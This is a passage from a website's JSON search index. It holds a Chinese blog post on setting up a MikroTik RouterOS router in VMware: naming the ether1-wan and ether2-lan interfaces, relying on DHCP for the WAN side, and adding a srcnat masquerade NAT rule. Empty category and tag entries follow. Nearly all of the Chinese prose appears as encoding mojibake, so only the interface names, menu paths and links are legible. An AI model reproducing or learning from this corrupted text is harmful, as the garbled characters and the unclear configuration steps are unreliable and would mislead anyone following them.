—å‡ºè·¯ç”±å™¨æ‹¥æœ‰çš„æ‰€æœ‰ç½‘å¡æ¥å£ï¼Œç‚¹å‡»ä¹‹åè¿›å…¥åˆ°æ¥å£è¯¦æƒ…ç•Œé¢ï¼Œåœ¨é‡Œé¢ä¼šåˆ—å‡ºè¯¥æ¥å£çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡ç½‘å¡çš„MACåˆ†è¾¨è¯¥ç½‘å¡å¯¹åº”åœ¨vmwareä¸­çš„ç½‘å¡ï¼Œå°†ä¸¤ä¸ªç½‘å¡åç§°åˆ†åˆ«è®¾ç½®ä¸ºether1-wanå’Œether2-lanï¼Œä¹‹ååœ¨ip-\u0026gt;addressesé€‰é¡¹å¡ä¸­å°†ether-lanè®¾ç½®ä¸ºä¸‹å›¾ã€‚ether1-wanä¸ç”¨è®¾ç½®ï¼Œå› ä¸ºè¯¥ç½‘å¡ç½‘ç»œç±»å‹ä¸ºnatä¼šè‡ªåŠ¨dhcpåˆ†é…\nä¹‹ååœ¨IP-\u0026gt;Firewall-\u0026gt;NATä¸­æ–°å»ºè§„åˆ™ï¼Œchainï¼šsrcnatï¼Œout.interface:ether2-lan,action:masquerade\nè¯¥è§„åˆ™å°†ä½¿å¾—è·¯ç”±å™¨ä¸¤è¾¹çš„ç½‘ç»œè”é€šã€‚\nå‚è€ƒ\nhttps://www.huaweicloud.com/articles/401014315f14d0fb8d5e3f5489693621.html http://www.roszj.com/1692.html http://www.irouteros.com/?p=583\n"},{"uri":"https://www.ch35tnut.site/zh-cn/categories/","title":"Categories","tags":[],"description":"","content":""},{"uri":"https://www.ch35tnut.site/zh-cn/tags/","title":"Tags","tags":[],"description":"","content":""}]